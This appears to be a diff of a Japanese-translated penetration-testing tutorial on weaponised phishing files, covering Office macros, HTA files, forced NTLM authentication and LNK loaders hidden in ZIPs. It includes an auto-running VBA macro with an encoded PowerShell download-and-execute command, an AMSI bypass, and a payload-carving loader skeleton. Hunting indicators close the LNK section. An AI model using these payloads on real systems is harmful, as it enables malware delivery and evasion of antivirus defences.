@@ -1,40 +1,40 @@
-# Phishing Files & Documents
+# Phishing ファイルとドキュメント
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Office ドキュメント
 
-Microsoft Word は、ファイルを開く前にファイルのデータ検証を行います。データ検証は、OfficeOpenXML 標準に沿ったデータ構造の識別という形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。
+Microsoft Word は、ファイルを開く前にファイルのデータ検証を行います。データ検証は、OfficeOpenXML 標準に対するデータ構造の識別の形で実行されます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。
 
-通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。しかし、拡張子を変更してファイル名を変更しても、マクロの実行能力を保持することが可能です.\
-例えば、RTF ファイルは設計上 macros をサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word により処理され、macros の実行が可能になります.\
-同じ内部動作とメカニズムは Microsoft Office Suite (Excel, PowerPoint etc.) のすべてのソフトウェアに適用されます。
+通常、マクロを含む Word ファイルは `.docm` 拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変更しても、マクロ実行能力を維持することが可能です.\
+例えば、RTF ファイルは設計上マクロをサポートしていませんが、DOCM ファイルを RTF にリネームすると Microsoft Word により処理され、マクロを実行可能になります.\
+同じ内部構造とメカニズムは Microsoft Office Suite（Excel、PowerPoint など）のすべてのソフトウェアに適用されます。
 
-以下のコマンドを使用して、どの拡張子がいくつかの Office プログラムによって実行されるかを確認できます：
+次のコマンドを使用して、いくつかの Office プログラムが実行する拡張子を確認できます：
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-macros を含むリモートテンプレートを参照する DOCX ファイル（File –Options –Add-ins –Manage: Templates –Go）は、macros を“実行”することもできます。
+DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
 
-### External Image Load
+### 外部画像の読み込み
 
 Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References、**Filed names**: includePicture、および**Filename or URL**:_ http://<ip>/whatever
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
-文書から任意のコードを実行するためにmacrosを使用することが可能です。
+文書内の macros を使って任意のコードを実行することが可能です。
 
-#### Autoload functions
+#### Autoload 関数
 
-The more common they are, the more probable the AV will detect them.
+一般的なものほど、AV に検出されやすくなります。
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Macros コード例
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -66,14 +66,14 @@ proc.Create "powershell <beacon line generated>
 ```
 #### メタデータを手動で削除
 
-「**File > Info > Inspect Document > Inspect Document**」に移動すると Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。
+**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。
 
 #### Doc 拡張子
 
-完了したら、**Save as type** ドロップダウンで形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
-これは、**`.docx` にマクロを保存できない**ことと、マクロ有効の **`.docm`** 拡張子にはスティグマ（例：サムネイルアイコンに大きな `!` が表示され、一部の web/メールゲートウェイが完全にブロックする） があるためです。したがって、この **レガシーな `.doc` 拡張子が最良の妥協策** です。
+完了したら **Save as type** ドロップダウンを選択し、フォーマットを **`.docx`** から **Word 97-2003 `.doc`** に変更します。\\  
+これは **`.docx` 内にマクロを保存できない** のと、マクロ対応の **`.docm`** 拡張子に対するスティグマがあるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/メールゲートウェイで完全にブロックされることがあります）。したがって、この **レガシーな `.doc` 拡張子が最良の妥協案** です。
 
-#### Malicious Macros Generators
+#### 悪意のあるマクロ生成ツール
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ proc.Create "powershell <beacon line generated>
 
 ## HTA ファイル
 
-HTA は、HTML とスクリプト言語（VBScript や JScript など）を組み合わせた Windows プログラムです。ユーザーインターフェイスを生成し、ブラウザのセキュリティモデルの制約を受けずに「完全に信頼された」アプリケーションとして実行されます。
+HTA は **HTML とスクリプト言語（VBScript や JScript など）を組み合わせた** Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約を受けない「完全に信頼された」アプリケーションとして実行されます。
 
-HTA は **`mshta.exe`** を使用して実行され、通常は **Internet Explorer** とともにインストールされます。これにより **`mshta` は IE に依存** します。したがって、IE がアンインストールされている場合、HTA は実行できなくなります。
+HTA は **`mshta.exe`** を使用して実行され、通常 **Internet Explorer** とともに **インストールされます**。そのため **`mshta` は IE に依存します**。したがって、IE がアンインストールされている場合、HTA は実行できません。
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +138,11 @@ var_func
 self.close
 </script>
 ```
-## NTLM認証を強制する
+## NTLM 認証の強制
 
-**NTLM認証を「リモートで」強制する**方法はいくつかあります。例えば、ユーザがアクセスするメールやHTMLに**見えない画像**を埋め込む（場合によってはHTTP MitMでも）ことや、被害者にフォルダを開くだけで**認証を** **トリガーする**ような**ファイルのアドレス**を送る、などです。
+NTLM 認証を「リモートで」強制する方法はいくつかある。例えば、ユーザがアクセスするメールや HTML に **不可視の画像** を追加する（HTTP MitM でも？）。あるいは、フォルダを開くだけで **認証をトリガーする** ファイルの **アドレス** を被害者に送る、など。
 
-**これらのアイデアやその他の情報は次のページを参照してください：**
+**以下のページでこれらのアイデアや詳細を確認してください：**
 
 
 {{#ref}}
@@ -156,22 +156,22 @@ self.close
 
 ### NTLM Relay
 
-ハッシュや認証情報を盗むだけでなく、**NTLM relay attacks**を実行することも可能です：
+ハッシュや認証情報を盗むだけでなく、**perform NTLM relay attacks** も可能であることを忘れないでください：
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
+## LNK ローダー + ZIP 埋め込みペイロード (fileless chain)
 
-非常に効果的なキャンペーンは、2つの正規のデコイ文書（PDF/DOCX）と悪意ある.lnkを含むZIPを配布します。トリックは、実際のPowerShellローダーがZIPの生バイト列中のユニークなマーカーの後に格納されており、.lnkがそれを切り出してメモリ上で完全に実行する点です。
+非常に効果的なキャンペーンは、正規に見える二つのデコイドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布する。トリックは、実際の PowerShell ローダーが ZIP の生バイト列中のユニークなマーカーの後に格納されており、.lnk がそれを切り出して完全にメモリ上で実行する点にある。
 
-Typical flow implemented by the .lnk PowerShell one-liner:
+典型的なフロー（.lnk による PowerShell ワンライナーで実装される）:
 
-1) 一般的なパス（Desktop、Downloads、Documents、%TEMP%、%ProgramData%、およびカレント作業ディレクトリの親）から元のZIPを探す。
-2) ZIPのバイトを読み取り、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降が埋め込まれたPowerShellペイロードである。
-3) %ProgramData%にZIPをコピーし、そこで展開して、デコイの.docxを開いて正当らしく見せる。
-4) 現在のプロセスでAMSIをバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) 次段階をデオブスク化（例: 全ての#文字を削除）し、メモリ上で実行する。
+1) 一般的なパス（Desktop, Downloads, Documents, %TEMP%, %ProgramData% および カレントワーキングディレクトリの親）から元の ZIP を探す。
+2) ZIP のバイトを読み取り、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。
+3) %ProgramData% に ZIP をコピーし、そこで展開して、正規に見せかけるためにデコイの .docx を開く。
+4) カレントプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) 次のステージをデオブフスケート（例: すべての # 文字を除去）し、メモリ内で実行する。
 
 Example PowerShell skeleton to carve and run the embedded stage:
 ```powershell
@@ -190,22 +190,22 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 Invoke-Expression $code
 ```
-Notes
-- 配信では信頼された PaaS サブドメイン（例: *.herokuapp.com）を悪用することが多く、IP/UA に基づいてペイロードを制限し（良性の ZIP を返す）ことがある。
-- 次段階では base64/XOR shellcode を復号化し、Reflection.Emit + VirtualAlloc 経由で実行してディスク痕跡を最小化することが多い。
+注意事項
+- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
+- 次のステージでは、ディスク上の痕跡を最小化するために base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc を介して実行することが多い。
 
-Persistence used in the same chain
-- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer やそれを埋め込むアプリがペイロードを自動的に再起動するようにする。詳細とすぐ使えるコマンドは以下を参照:
+同じチェーンで使用される Persistence
+- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer やそれを埋め込むアプリが自動的に payload を再実行するようにする。詳細と利用可能なコマンドは以下を参照:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- アーカイブデータの末尾に ASCII マーカー文字列（例: xFIQCV）が追記された ZIP ファイル。
-- .lnk が親/ユーザフォルダを列挙して ZIP を特定し、デコイ文書を開く。
-- AMSI を [System.Management.Automation.AmsiUtils]::amsiInitFailed を使って改ざんする。
-- 長時間続くビジネススレッドが、信頼された PaaS ドメインにホストされたリンクで終わる。
+- アーカイブデータ末尾に ASCII マーカー文字列（例: xFIQCV）が追記された ZIP ファイル。
+- .lnk が親/ユーザフォルダを列挙して ZIP を探し、デコイ文書を開く。
+- AMSI の改ざん（[System.Management.Automation.AmsiUtils]::amsiInitFailed を利用）。
+- 長時間実行される業務スレッドが、信頼された PaaS ドメイン上にホストされたリンクで終わる。
 
 ## References
 
